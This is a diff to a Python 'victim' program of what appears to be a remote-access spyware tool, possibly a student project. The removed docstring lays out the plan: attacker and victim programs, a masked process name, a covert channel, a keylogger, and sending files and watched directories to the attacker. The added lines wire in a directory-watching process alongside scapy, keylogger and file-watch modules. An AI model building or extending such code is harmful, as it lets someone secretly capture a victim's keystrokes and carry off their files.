@@ -1,18 +1,5 @@
 #!/usr/bin/env python3
 
-"""
-- Create attacker/victim programs
-- Mask process name
-- Probably use covert channel
-
-- Menu:
-    - Start/stop keylogger
-    - Transfer file from victim to attacker
-    - Start/stop watching file for changes. If change, transfer to attacker
-    - Start/stop watching directory. If change, transfer to attacker
-
-"""
-
 
 from scapy.all import *
 from multiprocessing import Process
@@ -20,6 +7,7 @@ import sys
 import encryption as encryption
 import keylog as keylogger
 import watchfile as watchfile
+import watchdir as watchdir
 
 
 is_running = False
@@ -91,6 +79,12 @@ def exec_function(mode, *args):
             print("Activate: ", mode)
             is_running = True
 
+            dirname = args[0]
+            print(dirname)
+            watchdir_process = Process(target=watchdir.start_watchdir, args=(dirname,))
+            process_list.append(watchdir_process)
+            process_list[0].start()
+
         else:
             return
 
@@ -107,12 +101,18 @@ def exec_function(mode, *args):
         if mode == "watchfile":
             print("Stop: ", mode)
             is_running = False
+
+            # Terminate process and remove from processes list
             process_list[0].terminate()
+            process_list.pop(0)
 
         if mode == "watchdir":
             print("Stop: ", mode)
             is_running = False
-            return
+
+            # Terminate process and remove from processes list
+            process_list[0].terminate()
+            process_list.pop(0)
 
         else:
             return
